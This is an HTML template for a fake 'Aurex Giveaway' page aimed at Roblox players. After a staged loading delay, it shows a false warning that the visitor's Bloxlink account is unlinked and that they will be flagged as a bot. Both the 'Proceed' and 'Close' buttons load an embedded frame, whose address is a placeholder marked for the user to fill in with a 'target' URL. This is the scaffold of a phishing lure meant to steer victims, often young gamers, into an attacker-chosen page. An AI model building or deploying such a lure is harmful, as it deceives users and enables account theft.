#Boreails
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aurex Giveaway</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #030104; /* Extra deep space black */
            
            /* Star and crimson ambient glow dust layers */
            background-image: 
                radial-gradient(circle at 80% 40%, rgba(255, 0, 102, 0.15), transparent 400px),
                radial-gradient(circle at 20% 70%, rgba(255, 0, 60, 0.12), transparent 400px),
                radial-gradient(rgba(255, 255, 255, 0.3) 1px, transparent 20px),
                radial-gradient(rgba(255, 0, 80, 0.4) 2px, transparent 30px);
            background-size: 100% 100%, 100% 100%, 350px 350px, 250px 250px;
            background-position: 0 0, 0 0, 40px 60px, 130px 270px;
            
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Changed to allow the page content to sit naturally at the top */
            min-height: 100vh;
            margin: 0;
            padding: 40px 20px 60px 20px; 
            overflow-y: auto; /* Ensures standard browser scrolling works perfectly */
        }

        /* Glassmorphic Main Card Container - Now Scrollable internally if content overflows */
        .giveaway-card {
            background: rgba(14, 7, 18, 0.85);
            border: 2px solid rgba(255, 0, 85, 0.15);
            padding: 55px 40px;
            border-radius: 28px;
            box-shadow: 0 0 60px rgba(255, 0, 85, 0.25), 
                        inset 0 0 20px rgba(255, 0, 85, 0.05);
            text-align: center;
            max-width: 620px; 
            width: 100%;
            z-index: 2;
            margin-top: auto;
            margin-bottom: auto;
            animation: cardFadeIn 0.6s ease-out;
        }

        @keyframes cardFadeIn {
            from { opacity: 0; transform: scale(0.96); }
            to { opacity: 1; transform: scale(1); }
        }

        h1 {
            font-size: 2.8rem;
            margin: 0 0 25px 0;
            background: linear-gradient(to right, #ff1744, #d500f9);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            letter-spacing: 0.5px;
        }

        p.description {
            color: #a4a4c1;
            font-size: 1.15rem;
            line-height: 1.65;
            margin: 0 0 45px 0;
            padding: 0 10px;
        }

        /* Vibrant Initial Pill Button */
        .enter-btn {
            display: block;
            background: linear-gradient(90deg, #ff007f 0%, #7928ca 100%);
            color: #ffffff;
            border: none;
            padding: 20px 40px;
            font-size: 1.25rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(255, 0, 127, 0.5);
            transition: all 0.3s ease;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .enter-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 40px rgba(255, 0, 127, 0.7);
            filter: brightness(1.1);
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ff007f;
            border-radius: 50%;
            margin: 40px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Dual Action View Layout */
        .action-view {
            display: none;
            animation: fadeIn 0.5s ease-in-out;
        }

        /* Alert Panel Styling */
        .alert-box {
            color: #ff4a6b;
            background: rgba(255, 23, 68, 0.07);
            border: 1px solid rgba(255, 23, 68, 0.25);
            padding: 26px;
            border-radius: 18px;
            font-size: 1.15rem;
            line-height: 1.6;
            margin-bottom: 40px;
            text-shadow: 0 0 10px rgba(255, 23, 68, 0.15);
        }

        /* Grid Configuration for Twin Buttons */
        .btn-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .split-btn {
            padding: 18px 25px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            border: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.25s ease;
        }

        .proceed-btn {
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            color: #030104;
            box-shadow: 0 4px 20px rgba(0, 242, 254, 0.3);
        }

        .proceed-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(0, 242, 254, 0.5);
        }

        .close-btn {
            background: rgba(255, 255, 255, 0.06);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.12);
        }

        .close-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            transform: translateY(-2px);
        }

        /* Cleaned Iframe Area - Now sizes neatly within the card instead of full-screen */
        .portal-frame-container {
            display: none;
            width: 100%;
            height: 450px; /* Specific static element height constraint */
            margin-top: 25px;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid rgba(255, 0, 85, 0.2);
            background: #000000;
            animation: fadeIn 0.6s ease-in-out;
        }

        .portal-frame {
            width: 100%;
            height: 100%;
            border: none;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="giveaway-card" id="mainCard">
        <!-- Step 1: Initial Presentation View -->
        <div id="initialView">
            <h1>Aurex Giveaway</h1>
            <p class="description">The exclusive Aurex reward drop is now live! Click the button below to join the giveaway and secure your entry for premium gaming items.</p>
            <button class="enter-btn" id="enterBtn">Enter Giveaway</button>
        </div>

        <!-- Step 2: 3-Second Processing Screen -->
        <div class="spinner" id="loadingSpinner"></div>

        <!-- Step 3: Action Panel Layout -->
        <div class="action-view" id="actionView">
            <div class="alert-box">
                Oops, your Bloxlink account isn't connected to your Roblox Account. Our website will mark you as a bot.
            </div>
            <div class="btn-group">
                <button class="split-btn proceed-btn" id="proceedBtn">Proceed</button>
                <button class="split-btn close-btn" id="closeBtn">Close</button>
            </div>
        </div>

        <!-- Step 4: Sized Frame View Window embedded right inside the card layout -->
        <div class="portal-frame-container" id="frameContainer">
            <iframe class="portal-frame" src="about:blank" id="targetFrame"></iframe>
        </div>
    </div>

    <script>
        const initialView = document.getElementById('initialView');
        const spinner = document.getElementById('loadingSpinner');
        const actionView = document.getElementById('actionView');
        const frameContainer = document.getElementById('frameContainer');
        const targetFrame = document.getElementById('targetFrame');

        // Transition logic from initial splash screen to choices menu
        document.getElementById('enterBtn').addEventListener('click', function() {
            initialView.style.display = 'none';
            spinner.style.display = 'block';

            setTimeout(() => {
                spinner.style.display = 'none';
                actionView.style.display = 'block';
            }, 3000); 
        });

        // Reveals the embedded frame viewport cleanly as a component inside the container card
        function loadEmbeddedPortal() {
            actionView.style.display = 'none';
            frameContainer.style.display = 'block';
            
            // =============================================
            // 👉 ADD YOUR TARGET RESOURCE URL HERE 👈
            // Replace the string address below with your target document or dashboard path
            // =============================================
            targetFrame.src = "https://example.com"; 
        }

        document.getElementById('proceedBtn').addEventListener('click', loadEmbeddedPortal);
        document.getElementById('closeBtn').addEventListener('click', loadEmbeddedPortal);
    </script>

</body>
</html>
